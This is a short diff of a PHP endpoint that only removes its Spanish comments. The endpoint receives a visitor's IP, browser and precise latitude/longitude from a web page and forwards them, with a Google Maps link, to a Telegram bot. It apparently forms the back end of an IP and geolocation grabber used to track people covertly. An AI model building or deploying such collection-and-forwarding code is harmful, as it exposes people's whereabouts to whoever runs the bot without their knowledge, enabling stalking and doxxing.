@@ -2,7 +2,6 @@
 require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/telegram.php';
 
-// Recibe los datos enviados desde el navegador
 $input = json_decode(file_get_contents('php://input'), true);
 
 $ip        = $input['ip'] ?? 'Desconocida';
@@ -17,7 +16,6 @@ $lon       = $input['lon'] ?? 'No disponible';
 $accuracy  = $input['accuracy'] ?? 'No disponible';
 $ts        = gmdate('c');
 
-// Crea mensaje para Telegram
 $msg = "📱 <b>Info del dispositivo</b>\n".
        "🌐 IP: $ip\n".
        "🖥 Navegador: $browser\n".
@@ -35,9 +33,7 @@ $msg = "📱 <b>Info del dispositivo</b>\n".
         ? "🌍 Google Maps: https://www.google.com/maps?q=$lat,$lon" 
         : "");
 
-// Envía a Telegram
 send_to_telegram($msg);
 
-// Devuelve respuesta JSON
 header('Content-Type: application/json');
 echo json_encode(['status' => 'ok']);
